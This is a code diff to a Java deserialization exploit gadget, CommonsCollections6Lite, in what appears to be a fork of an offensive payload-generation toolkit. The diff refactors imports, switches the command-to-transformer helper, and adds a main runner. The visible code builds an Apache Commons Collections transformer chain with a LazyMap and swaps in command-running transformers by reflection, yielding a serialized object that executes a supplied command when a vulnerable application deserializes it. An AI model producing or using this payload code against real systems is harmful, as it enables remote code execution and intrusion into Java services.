@@ -1,5 +1,7 @@
 package A.R.ysogate.payloads.gadgets;
 
+import A.R.ysogate.payloads.utils.Gadgets;
+import A.R.ysogate.payloads.utils.PayloadRunner;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
@@ -8,8 +10,7 @@ import org.apache.commons.collections.map.LazyMap;
 import A.R.ysogate.payloads.ObjectPayload;
 import A.R.ysogate.payloads.annotation.Authors;
 import A.R.ysogate.payloads.annotation.Dependencies;
-import A.R.ysogate.payloads.util.Reflections;
-import A.R.ysogate.payloads.util.TransformerUtil;
+import A.R.ysogate.payloads.utils.Reflections;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -22,7 +23,7 @@ public class CommonsCollections6Lite implements ObjectPayload<Object> {
 	@Override
 	public Object getObject(String command) throws Exception {
 		Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
-		Transformer[] transformers     = TransformerUtil.makeTransformer(command);
+		Transformer[] transformers     = Gadgets.makeTransformer(command);
 		Transformer   transformerChain = new ChainedTransformer(fakeTransformers);
 		Map           innerMap         = new HashMap();
 		Map           outerMap         = LazyMap.decorate(innerMap, transformerChain);
@@ -33,5 +34,9 @@ public class CommonsCollections6Lite implements ObjectPayload<Object> {
 
 		Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
 		return expMap;
+	}
+
+	public static void main(final String[] args) throws Exception {
+		PayloadRunner.run(CommonsCollections6Lite.class, args);
 	}
 }
